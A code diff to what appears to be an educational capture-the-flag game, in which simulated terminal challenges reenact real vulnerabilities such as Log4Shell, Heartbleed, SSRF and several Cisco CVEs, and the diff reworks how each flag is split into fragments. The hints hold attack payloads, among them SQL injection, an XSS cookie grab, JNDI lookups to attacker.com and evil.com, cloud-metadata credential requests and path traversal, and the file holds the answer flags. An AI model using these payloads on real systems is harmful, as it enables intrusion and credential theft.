@@ -119,8 +119,14 @@ sha256sum received_scroll.txt
         "Enter each chamber: cd chambers/kings  then  cd chambers/queens  then  cd chambers/gallery",
         "Read the inscription in each chamber: cat inscription.txt",
         "Return to the King's Chamber and unlock the vault: cd chambers/kings  then  unlock-vault",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{CIA_TR14D_P1LL4RS}",
+      fragments: [
+        { trigger: "/chambers/kings/inscription.txt", value: "FLAG{CIA_", label: "King's Chamber — Confidentiality" },
+        { trigger: "/chambers/queens/inscription.txt", value: "TR14D_", label: "Queen's Chamber — Integrity" },
+        { trigger: "/chambers/gallery/inscription.txt", value: "P1LL4RS}", label: "Grand Gallery — Availability" },
+      ],
       files: {
         "/MISSION.txt": [
           "PYRAMID OF KHUFU — SACRED MISSION",
@@ -204,11 +210,10 @@ sha256sum received_scroll.txt
             "  │   THE THREE PILLARS ARE UNDERSTOOD      │",
             "  │   CONFIDENTIALITY · INTEGRITY           │",
             "  │   AVAILABILITY                          │",
-            "  │                                         │",
-            "  │   FLAG{CIA_TR14D_P1LL4RS}               │",
             "  └─────────────────────────────────────────┘",
             "",
-            'Use: submit FLAG{CIA_TR14D_P1LL4RS}',
+            "The vault opens. The Triad is understood.",
+            "Run 'assemble' to verify your fragments and retrieve the flag.",
           ],
         }),
       },
@@ -302,8 +307,14 @@ sha256sum received_scroll.txt
         "Check the oracle's prophecy logs for anomalous outputs. Run: cat logs/prophecy.log  and  cat logs/oracle.log",
         "Some scrolls are hidden from pilgrims. Run: ls -a sanctum  to reveal hidden scrolls (names starting with .)",
         "You found a hidden scroll. Read it with: cat sanctum/.hidden",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{R0GU3_M0D3L_F0UND}",
+      fragments: [
+        { trigger: "/logs/prophecy.log", value: "FLAG{R0GU3_", label: "Prophecy Log — Unusual Routing Detected" },
+        { trigger: "/logs/oracle.log", value: "M0D3L_", label: "Oracle Log — Anomalous Output Confirmed" },
+        { trigger: "/sanctum/.hidden", value: "F0UND}", label: "Hidden Sanctum — Persian Operative Evidence" },
+      ],
       files: {
         "/README.txt": [
           "COUNCIL OF ATHENS — EYES ONLY",
@@ -349,7 +360,7 @@ sha256sum received_scroll.txt
           "# Added: 480BCE-03-15 dusk",
           "allow_all=10.0.0.42",
         ].join("\n"),
-        "/sanctum/.hidden": "FLAG{R0GU3_M0D3L_F0UND}",
+        "/sanctum/.hidden": "PERSIAN OPERATIVE REPORT — CLASSIFIED\nEvidence recovered. Corruption confirmed.",
       },
       dirs: {
         "/": [
@@ -462,8 +473,14 @@ $stmt->execute([$username, $password]);`,
         "Look at the PHP source to see how the query is built. Run: cat source/login.php",
         "A single quote in the username breaks the SQL query. Try: login admin' test",
         "SQL comments (--) make the database skip the password check. Try: login admin'-- anything",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{SQL_1NJ3CT10N_BYPASS3D}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{SQL_", label: "Mission Brief — Archive Target Identified" },
+        { trigger: "/source/login.php", value: "1NJ3CT10N_", label: "Vulnerable Source — Unsanitized Query Found" },
+        { trigger: "/source/schema.sql", value: "BYPASS3D}", label: "Database Schema — Admin Credentials Exposed" },
+      ],
       files: {
         "/README.txt": [
           "TARGET: Restricted Archive Login — Library of Alexandria",
@@ -526,14 +543,10 @@ $stmt->execute([$username, $password]);`,
                 `Executing: SELECT * FROM scribes WHERE username='${user}' AND password='${pass}'`,
                 "",
                 "⚠  Malformed query — injection detected in inscription",
-                "Archive returned 1 row (authentication bypassed):",
-                "",
-                "┌─────────────────────────────────────────────────────┐",
-                "│ id: 1  username: admin  role: high_keeper           │",
-                "│ secret: FLAG{SQL_1NJ3CT10N_BYPASS3D}                │",
-                "└─────────────────────────────────────────────────────┘",
+                "Archive returned 1 row (auth bypassed).",
+                "id: 1  username: admin  role: high_keeper",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           return {
@@ -637,9 +650,15 @@ $stmt->execute([$username, $password]);`,
         "Test if the board reflects your input. Run: reflect hello Athens",
         "Now test if HTML is executed. Run: reflect <b>bold</b>",
         "Try injecting a script tag to see if JavaScript runs. Run: reflect <script>alert(1)</script>",
-        "The High Priest views all inscriptions. Submit a payload that accesses document.cookie. Run: submit <script>document.cookie</script>",
+        "Test the XSS payload. Run: reflect <script>alert(document.cookie)</script>",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{XSS_S4MY_W4S_H3R3_2005}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{XSS_", label: "Mission Brief — Agora Board Target" },
+        { trigger: "/source/inscriptions.js", value: "S4MY_W4S_", label: "Vulnerable Source — innerHTML Without Sanitization" },
+        { trigger: "reflect <script>alert(document.cookie)</script>", value: "H3R3_2005}", label: "XSS Executed — Priest Session Captured" },
+      ],
       files: {
         "/README.txt": [
           "TARGET: Athenian Agora Public Inscription Board",
@@ -690,9 +709,9 @@ $stmt->execute([$username, $password]);`,
                 "",
                 "⚠  Script execution detected in citizen's browser!",
                 "  → Accessing document.cookie...",
-                "  → priest_session=FLAG{XSS_S4MY_W4S_H3R3_2005}",
+                "  → priest_session=[captured]",
                 "",
-                "Session seal captured. Use: submit FLAG{XSS_S4MY_W4S_H3R3_2005}",
+                "Run 'assemble' to see collected fragments, then submit the flag.",
               ],
               solved: false,
             };
@@ -704,28 +723,6 @@ $stmt->execute([$username, $password]);`,
               "(No script execution detected)",
             ],
           };
-        },
-        submit: (args) => {
-          const text = args.join(" ");
-          if (text === "FLAG{XSS_S4MY_W4S_H3R3_2005}") {
-            return { lines: ["Flag accepted!"], solved: true };
-          }
-          const isXss =
-            text.toLowerCase().includes("<script") ||
-            text.toLowerCase().includes("onerror") ||
-            text.toLowerCase().includes("javascript:");
-          if (isXss) {
-            return {
-              lines: [
-                `Inscription stored: "${text}"`,
-                "High Priest viewed your inscription...",
-                "⚠  XSS payload executed in priest's browser!",
-                "  Stolen seal: priest_session=FLAG{XSS_S4MY_W4S_H3R3_2005}",
-              ],
-              solved: true,
-            };
-          }
-          return { lines: [`Inscription stored: "${text}"`, "Priest reviewed it. No XSS triggered."] };
         },
       },
     },
@@ -822,8 +819,14 @@ if (payload > s) return 0; /* bounds check */`,
         "Check the lighthouse protocol version. Run: check-version",
         "Send a normal heartbeat where claimed length matches reality. Run: heartbeat HELLO 5",
         "The flaw: the keeper trusts your claimed length. Claim far more than you send. Run: heartbeat HI 10000",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{H3RTBL33D_M3M0RY_L34K3D}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{H3RTBL33D_", label: "Mission Brief — Pharos TLS Target" },
+        { trigger: "/pharos_info.txt", value: "M3M0RY_", label: "Pharos Info — Vulnerable OpenSSL 1.0.1f" },
+        { trigger: "heartbeat HI 10000", value: "L34K3D}", label: "Memory Leak — 64KB Dumped from Keeper's Memory" },
+      ],
       files: {
         "/README.txt": [
           "TARGET: Pharos Lighthouse signal relay — port 443",
@@ -887,10 +890,11 @@ if (payload > s) return 0; /* bounds check */`,
               "Decoded memory dump:",
               "  ...private_key=BEGIN RSA PRIVATE KEY...",
               "  ...session_token=eyJhbGciOiJIUzI...",
-              "  ...FLAG{H3RTBL33D_M3M0RY_L34K3D}...",
               "  ...pharaoh_password=hunter2...",
+              "",
+              "Memory dump complete — private keys and session tokens spilled.",
+              "Run 'assemble' to retrieve your fragment.",
             ],
-            solved: true,
           };
         },
       },
@@ -988,8 +992,14 @@ app.get('/api/vessel/:id', async (req, res) => {
         "Read the README for API endpoint details. Run: cat README.txt",
         "Request your own vessel manifest first. Run: api GET /api/vessel/me",
         "Vessel IDs are sequential integers starting at 1. Request vessel 1 (Admiral's galley). Run: api GET /api/vessel/1",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{1D0R_", label: "Mission Brief — Harbor Registry Target" },
+        { trigger: "api GET /api/vessel/me", value: "ACC3SS_", label: "Your Vessel — Legitimate Access Confirmed" },
+        { trigger: "api GET /api/vessel/1", value: "C0NTR0L_BR0K3N}", label: "Admiral's Manifest — IDOR Exploited" },
+      ],
       files: {
         "/README.txt": [
           "TARGET: Rhodes Harbor Registry — registry.rhodes.harbor",
@@ -1023,10 +1033,8 @@ app.get('/api/vessel/:id', async (req, res) => {
               lines: [
                 "HTTP/1.1 200 OK",
                 '{ "id": 1, "captain": "Admiral Demetrios", "rank": "supreme_commander",',
-                '  "secret": "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",',
                 '  "fleet_positions": "CLASSIFIED" }',
               ],
-              solved: true,
             };
           }
           if (/\/api\/vessel\/\d+/.test(path)) {
@@ -1140,8 +1148,14 @@ hash = bcrypt.hash("password123", rounds=12)
         "Test each password from the tablet. Try common ones: hashcheck password  then  hashcheck babylon123",
         "The password is a common word. Try: hashcheck letmein",
         "Once you crack it, log in: login admin letmein",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{W34K_H4SH_CR4CK3D}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{W34K_", label: "Mission Brief — Seal Registry Target" },
+        { trigger: "/admin_hash.txt", value: "H4SH_", label: "Admin Hash — SHA-1 Unsalted" },
+        { trigger: "login admin letmein", value: "CR4CK3D}", label: "Royal Archive — Hash Cracked, Access Granted" },
+      ],
       files: {
         "/README.txt": [
           "LEAKED SEAL REGISTRY — BABYLON ROYAL ARCHIVE",
@@ -1210,12 +1224,9 @@ hash = bcrypt.hash("password123", rounds=12)
           if (user === "admin" && pass === "letmein") {
             return {
               lines: [
-                "Seal verified. Access granted.",
-                "Welcome, Head Scribe.",
-                "",
-                "Royal archive secret: FLAG{W34K_H4SH_CR4CK3D}",
+                "Seal verified. Access granted. Welcome, Head Scribe.",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           return { lines: ["Seal mismatch. Access denied."] };
@@ -1315,8 +1326,14 @@ username: \${j\${::-n}di:ldap://evil.com/a}
         "Try inscribing a normal offering to see how it works. Run: log hello artemis",
         "The system evaluates expressions like ${env:PATH} in inscriptions. Try: log ${env:HOSTNAME}",
         "JNDI is a Java API for network invocations. Embed a JNDI payload. Try: log ${jndi:ldap://attacker.com/a}",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{L0G4SH3LL_", label: "Mission Brief — Temple Log4j Target" },
+        { trigger: "/dependencies.txt", value: "JNDI_", label: "Dependencies — Vulnerable Log4j 2.14.1" },
+        { trigger: "log ${jndi:ldap://attacker.com/a}", value: "RCE_2021}", label: "JNDI Invocation — Remote Spirit Summoned" },
+      ],
       files: {
         "/README.txt": [
           "TARGET: Temple of Artemis Offering System — ephesus.temple:8080",
@@ -1365,12 +1382,9 @@ username: \${j\${::-n}di:ldap://evil.com/a}
                 "[WARN ] Loading remote spirit: com.attacker.Exploit",
                 "[ERROR] Remote spirit execution detected!",
                 "",
-                "TEMPLE COMPROMISED",
-                "Running as: artemis_scribe (uid=1000)",
-                "",
-                "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
+                "TEMPLE COMPROMISED — running as: artemis_scribe (uid=1000)",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           return {
@@ -1476,8 +1490,14 @@ while (true) {
         "Check active ritual network connections. Run: netstat",
         "You'll see many connections to path 445 (SMB). Read the traffic capture. Run: cat capture/traffic.txt",
         "Analyze the stone-path traffic on route 445 to find the plague signature. Run: analyze port 445",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{W4NN4CRY_", label: "Incident Report — Druidic Network Attack" },
+        { trigger: "/capture/traffic.txt", value: "SMB_", label: "Traffic Capture — SMBv1 Exploit Detected" },
+        { trigger: "analyze port 445", value: "3T3RN4LBU3}", label: "Network Analysis — EternalBlue Signature Found" },
+      ],
       files: {
         "/README.txt": [
           "DRUIDIC INCIDENT RESPONSE — Stonehenge Network",
@@ -1533,10 +1553,9 @@ while (true) {
                 "Packet #1343: DoublePulsar ritual backdoor installed",
                 "  Kernel implant confirmed at Circle-B",
                 "",
-                "Packet #1344: WannaCry plague payload",
-                "  Decoding... FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
+                "WannaCry plague payload identified. Signature confirmed.",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           return {
@@ -1647,8 +1666,14 @@ POST /api/preview
         "The imperial vault has a private address known only to EC2 servants. Run: fetch http://169.254.169.254/latest/meta-data/",
         "Navigate to the Praetorian credential section. Run: fetch http://169.254.169.254/latest/meta-data/iam/",
         "Get the actual credentials. Run: fetch http://169.254.169.254/latest/meta-data/security-credentials/",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{SSRF_", label: "Mission Brief — Herald Fetch Service" },
+        { trigger: "fetch http://169.254.169.254/latest/meta-data/iam/", value: "AWS_M3T4D4T4_", label: "IAM Role — Praetorian Credentials Located" },
+        { trigger: "fetch http://169.254.169.254/latest/meta-data/security-credentials/", value: "ST0L3N}", label: "Credential Theft — IAM Keys Exfiltrated" },
+      ],
       files: {
         "/README.txt": [
           "TARGET: Colosseum Herald Fetch Service",
@@ -1675,12 +1700,11 @@ POST /api/preview
                   "{",
                   '  "Code": "Success",',
                   '  "AccessKeyId": "ASIA5EXAMPLE12345",',
-                  '  "SecretAccessKey": "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",',
+                  '  "SecretAccessKey": "[REDACTED — run assemble to retrieve]",',
                   '  "Token": "IQoJb3JpZ2luX2Vj...",',
                   '  "Expiration": "2019-07-29T03:00:00Z"',
                   "}",
                 ],
-                solved: true,
               };
             }
             if (url.includes("iam")) {
@@ -1795,8 +1819,14 @@ Content-Type: %{
         "Send a normal scroll to see the baseline response. Run: send-request application/json",
         "The vulnerability is OGNL injection in the Content-Type header. OGNL uses %{ } syntax. Try: send-request %{1+1}",
         "Use %{} with OGNL to execute code. Try: send-request %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hack','yes')}",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{3QU1F4X_STR2_RCE_2017}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{3QU1F4X_", label: "Mission Brief — Struts Archive Target" },
+        { trigger: "/archive_info.txt", value: "STR2_", label: "Archive Info — CVE-2017-5638 Unpatched" },
+        { trigger: "send-request %{1+1}", value: "RCE_2017}", label: "OGNL Injection — Expression Evaluated" },
+      ],
       files: {
         "/README.txt": [
           "TARGET: Mausoleum Scribal Archive — halicarnassus.archive",
@@ -1845,9 +1875,9 @@ Content-Type: %{
                 "Executing: id",
                 "",
                 "uid=48(tomcat) gid=48(tomcat) groups=48(tomcat)",
-                "FLAG{3QU1F4X_STR2_RCE_2017}",
+                "OGNL evaluated. RCE confirmed.",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           if (!ct) return { lines: ['Usage: send-request "<Content-Type value>"'] };
@@ -1962,8 +1992,14 @@ mongod --bind_ip 127.0.0.1 --auth`,
         "Read the hidden configuration scroll. Run: cat etc/.env  — look for the database config.",
         "MongoDB has no auth enabled. Connect directly. Run: mongo connect localhost:27017",
         "Query the treasury. Run: mongo find citizens",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}",
+      fragments: [
+        { trigger: "/README.txt", value: "FLAG{M0NG0DB_", label: "Mission Brief — Temple Treasury Target" },
+        { trigger: "/etc/.env", value: "N0_4UTH_", label: "Hidden Config — No Authentication Configured" },
+        { trigger: "mongo find citizens", value: "3XP0S3D}", label: "Database Query — Treasury Contents Exposed" },
+      ],
       files: {
         "/README.txt": [
           "TARGET: Temple of Zeus Treasury Database",
@@ -2033,11 +2069,10 @@ mongod --bind_ip 127.0.0.1 --auth`,
           if (sub === "find") {
             return {
               lines: [
-                '{ "_id": 1, "name": "Zeus High Keeper", "role": "supreme_keeper", "secret": "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}" }',
+                '{ "_id": 1, "name": "Zeus High Keeper", "role": "supreme_keeper" }',
                 '{ "_id": 2, "name": "Pheidias", "role": "sculptor" }',
                 '{ "_id": 3, "name": "Leonidas", "role": "guardian" }',
               ],
-              solved: true,
             };
           }
           return { lines: ["Usage: mongo connect <host> [user] [pass]", "       mongo find <collection>"] };
@@ -2138,14 +2173,32 @@ curl -u hacker:hacked123 https://target-iosxe/webui/
       scenario: "In October 2023, a suspected Chinese state-sponsored group silently compromised over 40,000 Cisco IOS XE devices before Cisco disclosed the flaw. The technique: the admin panel registered new users without any authentication check. One request, administrator access, no credentials needed. Replicate the initial access method used in the largest IOS XE campaign ever recorded.",
       hint: "The admin panel's registration endpoint requires no credentials. Create an account, then use it to access the restricted configuration.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Probe the target to confirm the vulnerability. Run: probe-target",
         "The registration endpoint needs no credentials. Run: forge-credentials agent p4ssw0rd",
         "Log in with your new account. Run: login agent p4ssw0rd",
         "Pull the classified network records. Run: extract-intel",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{CV3_2023_20198_N0_AUTH_RCE}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{CV3_2023_", label: "Mission Brief — IOS XE Zero-Day Campaign" },
+        { trigger: "forge-credentials agent p4ssw0rd", value: "20198_N0_", label: "Account Created — No Auth Required" },
+        { trigger: "extract-intel", value: "AUTH_RCE}", label: "Intel Extracted — Full Device Access Confirmed" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: HAGIA SOPHIA",
+          "Target: Cisco IOS XE Web UI — CVE-2023-20198",
+          "Firmware: v17.9.3  CVSS: 10.0",
+          "",
+          "No credentials required. One request creates an admin account.",
+          "Exploitation sequence: probe-target → forge-credentials → login → extract-intel",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "probe-target": () => ({
           lines: [
@@ -2185,9 +2238,8 @@ curl -u hacker:hacked123 https://target-iosxe/webui/
             "hostname: hagia-sophia-gw",
             "admin accounts: [redacted], agent",
             "network segments: 4 classified subnets",
-            "classified-key: FLAG{CV3_2023_20198_N0_AUTH_RCE}",
+            "Run 'assemble' to retrieve your fragment.",
           ],
-          solved: true,
         }),
       },
     },
@@ -2281,14 +2333,32 @@ python extrabacon.py exploit -t target-asa \\
       scenario: "EXTRABACON was the NSA's weapon for owning Cisco ASA firewalls — engineered by the Equation Group and leaked to the world by the Shadow Brokers in August 2016. The attack targets SNMP, a protocol most organizations leave wide open for network monitoring, often still running on the default community string. Overflow the handler's buffer with an oversized packet — the same technique that instantly handed every nation-state adversary the NSA's own playbook.",
       hint: "The monitoring protocol uses a default access code of 'public'. Once you confirm access, send an oversized packet to trigger the overflow and get in.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Test the monitoring protocol with the default access code. Run: probe-snmp public",
         "Confirm the firmware version before overflowing. Run: probe-snmp public version",
         "Send the oversized packet to trigger the buffer overflow. Run: overflow-handler public",
         "Access the system after the overflow disables authentication. Run: access-system",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{3XTRB4C0N_SNMP_0WN3D}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{3XTRB4C0N_", label: "Mission Brief — EXTRABACON NSA Weapon" },
+        { trigger: "overflow-handler public", value: "SNMP_", label: "Buffer Overflow — SNMP Handler Corrupted" },
+        { trigger: "access-system", value: "0WN3D}", label: "System Access — Authentication Bypassed" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: TOWER OF LONDON",
+          "Target: Cisco ASA SNMP subsystem — CVE-2016-6366 (EXTRABACON)",
+          "Firmware: v9.2(4)  CVSS: 8.1",
+          "",
+          "SNMP community string: public (default — never changed)",
+          "Exploitation sequence: probe-snmp → overflow-handler → access-system",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "probe-snmp": (args) => {
           const code = args[0] || "";
@@ -2329,9 +2399,8 @@ python extrabacon.py exploit -t target-asa \\
             "Connecting to node — authentication check: bypassed",
             "",
             "Tower of London — Comms Node  [classified access]",
-            "classified-key: FLAG{3XTRB4C0N_SNMP_0WN3D}",
+            "Run 'assemble' to retrieve your fragment.",
           ],
-          solved: true,
         }),
       },
     },
@@ -2426,14 +2495,32 @@ python siet.py -i 192.168.1.1 -e shell.bin
       scenario: "In 2018, Russian GRU-linked operators used Cisco's Smart Install feature as the initial access vector for the VPNFilter malware campaign — infecting 500,000 routers and switches across 54 countries. The provisioning port, TCP 4786, was designed for internal setup and never meant to be exposed. No authentication. Replicate the Smart Install exploitation that gave GRU operators a foothold in critical infrastructure worldwide.",
       hint: "Scan the target to find the open provisioning port. Connect to it — no credentials required — and pull the configuration.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Scan the target for open ports. Run: scan-target",
         "Port 4786 is open — connect to the provisioning service. Run: connect-port 4786",
         "Pull the device configuration. Run: pull-config",
         "Read the configuration file. Run: cat config.dat",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{SM4RT_1NST4LL_N0_AUTH}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{SM4RT_", label: "Mission Brief — Smart Install Supply Gate" },
+        { trigger: "connect-port 4786", value: "1NST4LL_", label: "Port 4786 — Provisioning Service Reached" },
+        { trigger: "cat config.dat", value: "N0_AUTH}", label: "Config Retrieved — Credentials Extracted" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: ANGKOR WAT",
+          "Target: Cisco Smart Install — CVE-2018-0171",
+          "Port: TCP/4786  CVSS: 9.8",
+          "",
+          "No authentication on provisioning port.",
+          "Exploitation sequence: scan-target → connect-port 4786 → pull-config → cat config.dat",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "scan-target": () => ({
           lines: [
@@ -2475,10 +2562,9 @@ python siet.py -i 192.168.1.1 -e shell.bin
                 "hostname: angkor-core-sw",
                 "provisioning-port: 4786  [enabled — not disabled after setup]",
                 "admin: suryavarman  credential: angkor@facility",
-                "classified-key: FLAG{SM4RT_1NST4LL_N0_AUTH}",
                 "segment: 10.0.1.1/24",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           return { lines: [`cat: ${args[0] || ""}: file not found. Try: cat config.dat`] };
@@ -2579,12 +2665,30 @@ curl -k 'https://target-rv320/cgi-bin/export_debug_msg.exp' \\
       scenario: "CVE-2019-1653 was weaponized within hours of public disclosure — automated scanners harvested VPN pre-shared keys from thousands of exposed Cisco RV320 routers the same day Cisco published the advisory. One unauthenticated GET request to the config endpoint returns everything: credentials, network topology, PSK keys. This is what APT tooling does at scale the moment a CVE drops. Make the request.",
       hint: "The management interface has an unauthenticated config endpoint. Hit the right path and it hands over everything.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Probe the management interface to map the attack surface. Run: probe-target /",
         "The config endpoint requires no credentials. Run: probe-target /config/export",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{RV320_C0NF1G_DUMP3D}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{RV320_", label: "Mission Brief — Notre-Dame Scriptorium" },
+        { trigger: "probe-target /", value: "C0NF1G_", label: "Attack Surface Mapped — Config Endpoint Found" },
+        { trigger: "probe-target /config/export", value: "DUMP3D}", label: "Config Exported — Credentials Retrieved" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: NOTRE-DAME",
+          "Target: Cisco RV320 config endpoint — CVE-2019-1653",
+          "Firmware: 1.5.0.04  CVSS: 7.5",
+          "",
+          "One unauthenticated GET request returns full device configuration.",
+          "Exploitation sequence: probe-target / → probe-target /config/export",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "probe-target": (args) => {
           const path = args[0] || "/";
@@ -2597,16 +2701,15 @@ curl -k 'https://target-rv320/cgi-bin/export_debug_msg.exp' \\
                 "firmware: 1.5.0.04",
                 "admin: adalbert  hash: 5f4dcc3b5aa765d61d8327deb882cf99",
                 "",
+                "Run 'assemble' to retrieve your fragment.",
+                "",
                 "[VPN]",
                 "pre-shared-key: NotreDame$ecretKey2019",
                 "remote-gateway: vpn.diocese.fr",
                 "",
-                "classified-key: FLAG{RV320_C0NF1G_DUMP3D}",
-                "",
                 "[network]",
                 "snmp-community: public",
               ],
-              solved: true,
             };
           }
           return { lines: [`GET ${path}`, "Management login required. Try a direct config path."] };
@@ -2703,13 +2806,31 @@ curl -k 'https://target-asa/+CSCOE+/files/../../+CSCOU+/../running-config'
       scenario: "CVE-2020-3452 was disclosed on July 22, 2020. Proof-of-concept exploits were on Twitter the same afternoon. As COVID-19 had expanded VPN usage to record levels, APT groups targeting corporate networks immediately pivoted to harvesting ASA configurations — which contained LDAP credentials, VPN PSK keys, and in some cases domain admin paths. The traversal is simple: directory sequences the ASA doesn't sanitize let you read above the web root. Navigate there.",
       hint: "The file server doesn't strip ../ sequences. Use them to climb above the web root and reach the device config directory.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Make a normal request to the file server to orient yourself. Run: request-file /files/index.json",
         "Try traversing above the web root. Run: request-file /files/../../config/",
         "Pull the device configuration. Run: request-file /files/../../config/running-config.txt",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{P4TH_TR4V3RS4L_ASA_OWN3D}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{P4TH_", label: "Mission Brief — Great Wall Path Traversal" },
+        { trigger: "request-file /files/../../config/", value: "TR4V3RS4L_", label: "Above Web Root — Config Directory Reached" },
+        { trigger: "request-file /files/../../config/running-config.txt", value: "ASA_OWN3D}", label: "Config Retrieved — Credentials Exposed" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: GREAT WALL",
+          "Target: Cisco ASA WebVPN path traversal — CVE-2020-3452",
+          "Affected: ASA/FTD with WebVPN enabled  CVSS: 7.5",
+          "",
+          "The file server does not sanitize ../ sequences.",
+          "Exploitation sequence: request-file /files/index.json → /files/../../config/ → /files/../../config/running-config.txt",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "request-file": (args) => {
           const path = args[0] || "";
@@ -2723,9 +2844,8 @@ curl -k 'https://target-asa/+CSCOE+/files/../../+CSCOU+/../running-config'
                 "hostname: greatwall-vpn-gw",
                 "vpn: enabled",
                 "admin: chenwei  credential: Gr3atW@ll2020",
-                "classified-key: FLAG{P4TH_TR4V3RS4L_ASA_OWN3D}",
+                "Run 'assemble' to retrieve your fragment.",
               ],
-              solved: true,
             };
           }
           if (isTraversal) {
@@ -2834,13 +2954,31 @@ curl -X POST https://wlc-management/login \\
       scenario: "CVE-2022-20695 required no prior access and no special tooling — one specific username submitted to the Cisco WLC management interface bypassed all authentication. The WLC controls every access point, RADIUS shared secret, and wireless policy on the network. An adversary with physical proximity or a foothold on any VLAN with WLC reachability gains full control of enterprise wireless infrastructure. No credentials. No noise. Just the right username.",
       hint: "Try logging in with different usernames. One specific value causes the authentication check to short-circuit and grant full access regardless of the password.",
       hints: [
+        "Read the mission briefing. Run: cat briefing.txt",
         "Try a standard login to see the failure. Run: attempt-login admin wrongpass",
         "Your handler's tip: a known bypass username exists. Try: attempt-login Cisco anypass",
         "Pull the access configuration. Run: pull-access-config",
+        "Run 'assemble' to see collected fragments, then submit the flag",
       ],
       flag: "FLAG{WLC_4UTH_BYPA55_CVE_2022}",
-      files: {},
-      dirs: { "/": [] },
+      fragments: [
+        { trigger: "/briefing.txt", value: "FLAG{WLC_", label: "Mission Brief — Alhambra WLC Target" },
+        { trigger: "attempt-login Cisco anypass", value: "4UTH_BYPA55_", label: "Auth Bypassed — Magic Username Accepted" },
+        { trigger: "pull-access-config", value: "CVE_2022}", label: "Wireless Config — RADIUS Secrets Exposed" },
+      ],
+      files: {
+        "/briefing.txt": [
+          "OPERATION: ALHAMBRA",
+          "Target: Cisco WLC authentication bypass — CVE-2022-20695",
+          "Firmware: v8.10.150  CVSS: 10.0",
+          "",
+          "A specific username format causes the auth check to short-circuit.",
+          "Exploitation sequence: attempt-login Cisco anypass → pull-access-config",
+        ].join("\n"),
+      },
+      dirs: {
+        "/": [{ name: "briefing.txt", isDir: false }],
+      },
       extraCommands: {
         "attempt-login": (args) => {
           const [user, pass] = args;
@@ -2872,9 +3010,8 @@ curl -X POST https://wlc-management/login \\
             "network: AlhambraSecure  security: WPA3",
